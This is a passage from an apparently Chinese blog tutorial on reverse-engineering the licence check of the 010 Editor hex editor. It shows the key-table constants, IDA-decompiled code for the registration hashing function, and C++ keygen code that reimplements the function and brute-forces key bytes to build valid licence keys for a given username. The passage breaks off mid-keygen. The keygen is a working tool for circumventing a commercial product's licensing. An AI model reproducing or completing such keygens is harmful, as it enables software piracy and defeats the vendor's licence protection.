class="number">0x1fa75e8b</span>, <span class="number">0x6f092fbe</span>, <span class="number">0x4a000d49</span>, <span class="number">0x57ae1c70</span>, <span class="number">0x004e2477</span>, <span class="number">0x561e7e72</span>,</span><br><span class="line"><span class="number">0x468c0033</span>, <span class="number">0x5dcc2402</span>, <span class="number">0x78507ac6</span>, <span class="number">0x58af24c7</span>, <span class="number">0x0df62d34</span>, <span class="number">0x358a4708</span>, <span class="number">0x3cfb1e11</span>, <span class="number">0x2b71451c</span>, <span class="number">0x77a75295</span>, <span class="number">0x56890721</span>, <span class="number">0x0fef75f3</span>, <span class="number">0x120f24f1</span>, <span class="number">0x01990ae7</span>, <span class="number">0x339c4452</span>, <span class="number">0x27a15b8e</span>, <span class="number">0x0ba7276d</span>,</span><br><span class="line"><span class="number">0x60dc1b7b</span>, <span class="number">0x4f4b7f82</span>, <span class="number">0x67db7007</span>, <span class="number">0x4f4a57d9</span>, <span class="number">0x621252e8</span>, <span class="number">0x20532cfc</span>, <span class="number">0x6a390306</span>, <span class="number">0x18800423</span>, <span class="number">0x19f3778a</span>, <span class="number">0x462316f0</span>, <span class="number">0x56ae0937</span>, <span class="number">0x43c2675c</span>, <span class="number">0x65ca45fd</span>, <span class="number">0x0d604ff2</span>, <span class="number">0x0bfd22cb</span>, <span class="number">0x3afe643b</span>,</span><br><span class="line"><span class="number">0x3bf67fa6</span>, <span class="number">0x44623579</span>, <span class="number">0x184031f8</span>, <span class="number">0x32174f97</span>, <span class="number">0x4c6a092a</span>, <span class="number">0x5fb50261</span>, <span class="number">0x01650174</span>, <span class="number">0x33634af1</span>, <span class="number">0x712d18f4</span>, <span class="number">0x6e997169</span>, <span class="number">0x5dab7afe</span>, <span class="number">0x7c2b2ee8</span>, <span class="number">0x6edb75b4</span>, <span class="number">0x5f836fb6</span>, <span class="number">0x3c2a6dd6</span>, <span class="number">0x292d05c2</span>,</span><br><span class="line"><span class="number">0x052244db</span>, <span class="number">0x149a5f4f</span>, <span class="number">0x5d486540</span>, <span class="number">0x331d15ea</span>, <span class="number">0x4f456920</span>, <span class="number">0x483a699f</span>, <span class="number">0x3b450f05</span>, <span class="number">0x3b207c6c</span>, <span class="number">0x749d70fe</span>, <span class="number">0x417461f6</span>, <span class="number">0x62b031f1</span>, <span class="number">0x2750577b</span>, <span class="number">0x29131533</span>, <span class="number">0x588c3808</span>, <span class="number">0x1aef3456</span>, <span class="number">0x0f3c00ec</span>,</span><br><span class="line"><span class="number">0x7da74742</span>, <span class="number">0x4b797a6c</span>, <span class="number">0x5ebb3287</span>, <span class="number">0x786558b8</span>, <span class="number">0x00ed4ff2</span>, <span class="number">0x6269691e</span>, <span class="number">0x24a2255f</span>, <span class="number">0x62c11f7e</span>, <span class="number">0x2f8a7dcd</span>, <span class="number">0x643b17fe</span>, <span class="number">0x778318b8</span>, <span class="number">0x253b60fe</span>, <span class="number">0x34bb63a3</span>, <span class="number">0x5b03214f</span>, <span class="number">0x5f1571f4</span>, <span class="number">0x1a316e9f</span>,</span><br><span class="line"><span class="number">0x7acf2704</span>, <span class="number">0x28896838</span>, <span class="number">0x18614677</span>, <span class="number">0x1bf569eb</span>, <span class="number">0x0ba85ec9</span>, <span class="number">0x6aca6b46</span>, <span class="number">0x1e43422a</span>, <span class="number">0x514d5f0e</span>, <span class="number">0x413e018c</span>, <span class="number">0x307626e9</span>, <span class="number">0x01ed1dfa</span>, <span class="number">0x49f46f5a</span>, <span class="number">0x461b642b</span>, <span class="number">0x7d7007f2</span>, <span class="number">0x13652657</span>, <span class="number">0x6b160bc5</span>,</span><br><span class="line"><span class="number">0x65e04849</span>, <span class="number">0x1f526e1c</span>, <span class="number">0x5a0251b6</span>, <span class="number">0x2bd73f69</span>, <span class="number">0x2dbf7acd</span>, <span class="number">0x51e63e80</span>, <span class="number">0x5cf2670f</span>, <span class="number">0x21cd0a03</span>, <span class="number">0x5cff0261</span>, <span class="number">0x33ae061e</span>, <span class="number">0x3bb6345f</span>, <span class="number">0x5d814a75</span>, <span class="number">0x257b5df4</span>, <span class="number">0x0a5c2c5b</span>, <span class="number">0x16a45527</span>, <span class="number">0x16f23945</span>&#125;;</span><br></pre></td></tr></table></figure><h5 id="复制加密代码"><a href="#复制加密代码" class="headerlink" title="复制加密代码"></a>复制加密代码</h5><p>回到IDA，之前还记得加密函数的第四个参数是四字节整数（013BDD98   .  FF77 20       PUSH DWORD PTR DS:[EDI+0x20]             ;  返回值（商）,第四个参数），但是IDA分析的是char类型，需要给他改过来</p><img src="010Editor的逆向/MainArg4.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>改完之后全选后复制</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_13BD120</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3, DWORD a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// edx@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// bl@2</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ecx@3</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ecx@4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// [sp+8h] [bp-10h]@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [sp+Ch] [bp-Ch]@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// [sp+10h] [bp-8h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+14h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = a1;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v14 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">15</span> * a4;</span><br><span class="line">    v15 = <span class="number">17</span> * a3;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="built_in">toupper</span>(v4[v6]);</span><br><span class="line">      v9 = v16 + dword_2E64148[v8];</span><br><span class="line">      <span class="keyword">if</span> ( a2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = dword_2E64148[v7]</span><br><span class="line">            + dword_2E64148[v15]</span><br><span class="line">            + dword_2E64148[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">47</span>)] * (dword_2E64148[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">13</span>)] ^ v9);</span><br><span class="line">        result = dword_2E64148[v14] + v10;</span><br><span class="line">        v16 = dword_2E64148[v14] + v10;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v12 = dword_2E64148[v7]</span><br><span class="line">            + dword_2E64148[v15]</span><br><span class="line">            + dword_2E64148[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">23</span>)] * (dword_2E64148[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">63</span>)] ^ v9);</span><br><span class="line">        result = dword_2E64148[v13] + v12;</span><br><span class="line">        v16 = dword_2E64148[v13] + v12;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 += <span class="number">19</span>;</span><br><span class="line">      ++v6;</span><br><span class="line">      v15 += <span class="number">9</span>;</span><br><span class="line">      v7 += <span class="number">13</span>;</span><br><span class="line">      v13 += <span class="number">7</span>;</span><br><span class="line">      v4 = a1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; v5 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>现在开始写成自己的代码</p><p>注</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_KeyArr[]&#123;</span><br><span class="line"><span class="number">0x39cb44b8</span>, <span class="number">0x23754f67</span>, <span class="number">0x5f017211</span>, <span class="number">0x3ebb24da</span>, <span class="number">0x351707c6</span>, <span class="number">0x63f9774b</span>, <span class="number">0x17827288</span>, <span class="number">0x0fe74821</span>, <span class="number">0x5b5f670f</span>, <span class="number">0x48315ae8</span>, <span class="number">0x785b7769</span>, <span class="number">0x2b7a1547</span>, <span class="number">0x38d11292</span>, <span class="number">0x42a11b32</span>, <span class="number">0x35332244</span>, <span class="number">0x77437b60</span>,</span><br><span class="line"><span class="number">0x1eab3b10</span>, <span class="number">0x53810000</span>, <span class="number">0x1d0212ae</span>, <span class="number">0x6f0377a8</span>, <span class="number">0x43c03092</span>, <span class="number">0x2d3c0a8e</span>, <span class="number">0x62950cbf</span>, <span class="number">0x30f06ffa</span>, <span class="number">0x34f710e0</span>, <span class="number">0x28f417fb</span>, <span class="number">0x350d2f95</span>, <span class="number">0x5a361d5a</span>, <span class="number">0x15cc060b</span>, <span class="number">0x0afd13cc</span>, <span class="number">0x28603bcf</span>, <span class="number">0x3371066b</span>,</span><br><span class="line"><span class="number">0x30cd14e4</span>, <span class="number">0x175d3a67</span>, <span class="number">0x6dd66a13</span>, <span class="number">0x2d3409f9</span>, <span class="number">0x581e7b82</span>, <span class="number">0x76526b99</span>, <span class="number">0x5c8d5188</span>, <span class="number">0x2c857971</span>, <span class="number">0x15f51fc0</span>, <span class="number">0x68cc0d11</span>, <span class="number">0x49f55e5c</span>, <span class="number">0x275e4364</span>, <span class="number">0x2d1e0dbc</span>, <span class="number">0x4cee7ce3</span>, <span class="number">0x32555840</span>, <span class="number">0x112e2e08</span>,</span><br><span class="line"><span class="number">0x6978065a</span>, <span class="number">0x72921406</span>, <span class="number">0x314578e7</span>, <span class="number">0x175621b7</span>, <span class="number">0x40771dbf</span>, <span class="number">0x3fc238d6</span>, <span class="number">0x4a31128a</span>, <span class="number">0x2dad036e</span>, <span class="number">0x41a069d6</span>, <span class="number">0x25400192</span>, <span class="number">0x00dd4667</span>, <span class="number">0x6afc1f4f</span>, <span class="number">0x571040ce</span>, <span class="number">0x62fe66df</span>, <span class="number">0x41db4b3e</span>, <span class="number">0x3582231f</span>,</span><br><span class="line"><span class="number">0x55f6079a</span>, <span class="number">0x1ca70644</span>, <span class="number">0x1b1643d2</span>, <span class="number">0x3f7228c9</span>, <span class="number">0x5f141070</span>, <span class="number">0x3e1474ab</span>, <span class="number">0x444b256e</span>, <span class="number">0x537050d9</span>, <span class="number">0x0f42094b</span>, <span class="number">0x2fd820e6</span>, <span class="number">0x778b2e5e</span>, <span class="number">0x71176d02</span>, <span class="number">0x7fea7a69</span>, <span class="number">0x5bb54628</span>, <span class="number">0x19ba6c71</span>, <span class="number">0x39763a99</span>,</span><br><span class="line"><span class="number">0x178d54cd</span>, <span class="number">0x01246e88</span>, <span class="number">0x3313537e</span>, <span class="number">0x2b8e2d17</span>, <span class="number">0x2a3d10be</span>, <span class="number">0x59d10582</span>, <span class="number">0x37a163db</span>, <span class="number">0x30d6489a</span>, <span class="number">0x6a215c46</span>, <span class="number">0x0e1c7a76</span>, <span class="number">0x1fc760e7</span>, <span class="number">0x79b80c65</span>, <span class="number">0x27f459b4</span>, <span class="number">0x799a7326</span>, <span class="number">0x50ba1782</span>, <span class="number">0x2a116d5c</span>,</span><br><span class="line"><span class="number">0x63866e1b</span>, <span class="number">0x3f920e3c</span>, <span class="number">0x55023490</span>, <span class="number">0x55b56089</span>, <span class="number">0x2c391fd1</span>, <span class="number">0x2f8035c2</span>, <span class="number">0x64fd2b7a</span>, <span class="number">0x4ce8759a</span>, <span class="number">0x518504f0</span>, <span class="number">0x799501a8</span>, <span class="number">0x3f5b2cad</span>, <span class="number">0x38e60160</span>, <span class="number">0x637641d8</span>, <span class="number">0x33352a42</span>, <span class="number">0x51a22c19</span>, <span class="number">0x085c5851</span>,</span><br><span class="line"><span class="number">0x032917ab</span>, <span class="number">0x2b770ac7</span>, <span class="number">0x30ac77b3</span>, <span class="number">0x2bec1907</span>, <span class="number">0x035202d0</span>, <span class="number">0x0fa933d3</span>, <span class="number">0x61255df3</span>, <span class="number">0x22ad06bf</span>, <span class="number">0x58b86971</span>, <span class="number">0x5fca0de5</span>, <span class="number">0x700d6456</span>, <span class="number">0x56a973db</span>, <span class="number">0x5ab759fd</span>, <span class="number">0x330e0be2</span>, <span class="number">0x5b3c0ddd</span>, <span class="number">0x495d3c60</span>,</span><br><span class="line"><span class="number">0x53bd59a6</span>, <span class="number">0x4c5e6d91</span>, <span class="number">0x49d9318d</span>, <span class="number">0x103d5079</span>, <span class="number">0x61ce42e3</span>, <span class="number">0x7ed5121d</span>, <span class="number">0x14e160ed</span>, <span class="number">0x212d4ef2</span>, <span class="number">0x270133f0</span>, <span class="number">0x62435a96</span>, <span class="number">0x1fa75e8b</span>, <span class="number">0x6f092fbe</span>, <span class="number">0x4a000d49</span>, <span class="number">0x57ae1c70</span>, <span class="number">0x004e2477</span>, <span class="number">0x561e7e72</span>,</span><br><span class="line"><span class="number">0x468c0033</span>, <span class="number">0x5dcc2402</span>, <span class="number">0x78507ac6</span>, <span class="number">0x58af24c7</span>, <span class="number">0x0df62d34</span>, <span class="number">0x358a4708</span>, <span class="number">0x3cfb1e11</span>, <span class="number">0x2b71451c</span>, <span class="number">0x77a75295</span>, <span class="number">0x56890721</span>, <span class="number">0x0fef75f3</span>, <span class="number">0x120f24f1</span>, <span class="number">0x01990ae7</span>, <span class="number">0x339c4452</span>, <span class="number">0x27a15b8e</span>, <span class="number">0x0ba7276d</span>,</span><br><span class="line"><span class="number">0x60dc1b7b</span>, <span class="number">0x4f4b7f82</span>, <span class="number">0x67db7007</span>, <span class="number">0x4f4a57d9</span>, <span class="number">0x621252e8</span>, <span class="number">0x20532cfc</span>, <span class="number">0x6a390306</span>, <span class="number">0x18800423</span>, <span class="number">0x19f3778a</span>, <span class="number">0x462316f0</span>, <span class="number">0x56ae0937</span>, <span class="number">0x43c2675c</span>, <span class="number">0x65ca45fd</span>, <span class="number">0x0d604ff2</span>, <span class="number">0x0bfd22cb</span>, <span class="number">0x3afe643b</span>,</span><br><span class="line"><span class="number">0x3bf67fa6</span>, <span class="number">0x44623579</span>, <span class="number">0x184031f8</span>, <span class="number">0x32174f97</span>, <span class="number">0x4c6a092a</span>, <span class="number">0x5fb50261</span>, <span class="number">0x01650174</span>, <span class="number">0x33634af1</span>, <span class="number">0x712d18f4</span>, <span class="number">0x6e997169</span>, <span class="number">0x5dab7afe</span>, <span class="number">0x7c2b2ee8</span>, <span class="number">0x6edb75b4</span>, <span class="number">0x5f836fb6</span>, <span class="number">0x3c2a6dd6</span>, <span class="number">0x292d05c2</span>,</span><br><span class="line"><span class="number">0x052244db</span>, <span class="number">0x149a5f4f</span>, <span class="number">0x5d486540</span>, <span class="number">0x331d15ea</span>, <span class="number">0x4f456920</span>, <span class="number">0x483a699f</span>, <span class="number">0x3b450f05</span>, <span class="number">0x3b207c6c</span>, <span class="number">0x749d70fe</span>, <span class="number">0x417461f6</span>, <span class="number">0x62b031f1</span>, <span class="number">0x2750577b</span>, <span class="number">0x29131533</span>, <span class="number">0x588c3808</span>, <span class="number">0x1aef3456</span>, <span class="number">0x0f3c00ec</span>,</span><br><span class="line"><span class="number">0x7da74742</span>, <span class="number">0x4b797a6c</span>, <span class="number">0x5ebb3287</span>, <span class="number">0x786558b8</span>, <span class="number">0x00ed4ff2</span>, <span class="number">0x6269691e</span>, <span class="number">0x24a2255f</span>, <span class="number">0x62c11f7e</span>, <span class="number">0x2f8a7dcd</span>, <span class="number">0x643b17fe</span>, <span class="number">0x778318b8</span>, <span class="number">0x253b60fe</span>, <span class="number">0x34bb63a3</span>, <span class="number">0x5b03214f</span>, <span class="number">0x5f1571f4</span>, <span class="number">0x1a316e9f</span>,</span><br><span class="line"><span class="number">0x7acf2704</span>, <span class="number">0x28896838</span>, <span class="number">0x18614677</span>, <span class="number">0x1bf569eb</span>, <span class="number">0x0ba85ec9</span>, <span class="number">0x6aca6b46</span>, <span class="number">0x1e43422a</span>, <span class="number">0x514d5f0e</span>, <span class="number">0x413e018c</span>, <span class="number">0x307626e9</span>, <span class="number">0x01ed1dfa</span>, <span class="number">0x49f46f5a</span>, <span class="number">0x461b642b</span>, <span class="number">0x7d7007f2</span>, <span class="number">0x13652657</span>, <span class="number">0x6b160bc5</span>,</span><br><span class="line"><span class="number">0x65e04849</span>, <span class="number">0x1f526e1c</span>, <span class="number">0x5a0251b6</span>, <span class="number">0x2bd73f69</span>, <span class="number">0x2dbf7acd</span>, <span class="number">0x51e63e80</span>, <span class="number">0x5cf2670f</span>, <span class="number">0x21cd0a03</span>, <span class="number">0x5cff0261</span>, <span class="number">0x33ae061e</span>, <span class="number">0x3bb6345f</span>, <span class="number">0x5d814a75</span>, <span class="number">0x257b5df4</span>, <span class="number">0x0a5c2c5b</span>, <span class="number">0x16a45527</span>, <span class="number">0x16f23945</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_13BD120</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3, <span class="keyword">unsigned</span> <span class="keyword">short</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* v4; <span class="comment">// edx@1</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// esi@1</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// edi@1</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v7; <span class="comment">// bl@2</span></span><br><span class="line"><span class="keyword">int</span> v8; <span class="comment">// eax@3</span></span><br><span class="line"><span class="keyword">int</span> v9; <span class="comment">// ecx@3</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// ecx@4</span></span><br><span class="line"><span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// ecx@5</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v13; <span class="comment">// [sp+8h] [bp-10h]@2</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [sp+Ch] [bp-Ch]@2</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v15; <span class="comment">// [sp+10h] [bp-8h]@2</span></span><br><span class="line"><span class="keyword">int</span> v16; <span class="comment">// [sp+14h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">v4 = a1;</span><br><span class="line">v16 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (v5 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v13 = <span class="number">0</span>;</span><br><span class="line">v14 = <span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">15</span> * a4;</span><br><span class="line">v15 = <span class="number">17</span> * a3;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v8 = <span class="built_in">toupper</span>(v4[v6]);</span><br><span class="line">v9 = v16 + g_KeyArr[v8];</span><br><span class="line"><span class="keyword">if</span> (a2)</span><br><span class="line">&#123;</span><br><span class="line">v10 = g_KeyArr[v7]</span><br><span class="line">+ g_KeyArr[v15]</span><br><span class="line">+ g_KeyArr[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">47</span>)] * (g_KeyArr[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">13</span>)] ^ v9);</span><br><span class="line">result = g_KeyArr[v14] + v10;</span><br><span class="line">v16 = g_KeyArr[v14] + v10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v12 = g_KeyArr[v7]</span><br><span class="line">+ g_KeyArr[v15]</span><br><span class="line">+ g_KeyArr[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">23</span>)] * (g_KeyArr[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">63</span>)] ^ v9);</span><br><span class="line">result = g_KeyArr[v13] + v12;</span><br><span class="line">v16 = g_KeyArr[v13] + v12;</span><br><span class="line">&#125;</span><br><span class="line">v14 += <span class="number">19</span>;</span><br><span class="line">++v6;</span><br><span class="line">v15 += <span class="number">9</span>;</span><br><span class="line">v7 += <span class="number">13</span>;</span><br><span class="line">v13 += <span class="number">7</span>;</span><br><span class="line">v4 = a1;</span><br><span class="line">&#125; <span class="keyword">while</span> (v6 &lt; v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">byte K[] = &#123; <span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">0x9C</span>,<span class="number">55</span>,<span class="number">66</span>,<span class="number">77</span>,<span class="number">88</span>,<span class="number">99</span>,<span class="number">0xAA</span> &#125;;</span><br><span class="line">srand(time(<span class="literal">NULL</span>));</span><br><span class="line">DWORD Reslt = <span class="number">0x3E8</span>;</span><br><span class="line">DWORD dwKey = sub_13BD120(<span class="string">&quot;hugang_first.github.io&quot;</span>,<span class="number">1</span>,<span class="number">0</span>, Reslt);<span class="comment">//这里的用户名可以输入自己的，也可以改成用户动态输入</span></span><br><span class="line">K[<span class="number">4</span>] = dwKey &amp; <span class="number">0xFF</span>;</span><br><span class="line">K[<span class="number">5</span>] = dwKey &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">K[<span class="number">6</span>] = dwKey &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">K[<span class="number">7</span>] = dwKey &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//AL = (K[0]^K[6]^0x18+0x3D)^0xA7</span></span><br><span class="line">byte K0 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K6 = K[<span class="number">6</span>];</span><br><span class="line">byte AL = (K0 ^ K6 ^ <span class="number">0x18</span> + <span class="number">0x3D</span>) ^ <span class="number">0xA7</span>;</span><br><span class="line"><span class="keyword">if</span> (AL &gt; <span class="number">0</span> &amp;&amp; AL &lt;= <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">K[<span class="number">0</span>] = K0;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">byte K1 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K2 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">byte K5 = K[<span class="number">5</span>];</span><br><span class="line">byte K7 = K[<span class="number">7</span>];</span><br><span class="line"><span class="comment">//DWORD ESI = (((K1 ^ K7) &amp; 0xFF) * 0x100) + ((K2 ^ K5 &amp; 0xFF) &amp; 0xFFFF);</span></span><br><span class="line">DWORD ESI = ((K1 ^ K7 &amp; <span class="number">0xFF</span>) * <span class="number">0x100</span>) + ((K2 ^ K5) &amp; <span class="number">0xFF</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line"><span class="comment">//DWORD EAX = (((ESI ^ 0x7892) + 0x4D30) ^ 0x3421) &amp; 0xFFFF;</span></span><br><span class="line">DWORD EAX = (((ESI ^ <span class="number">0x7892</span>) + <span 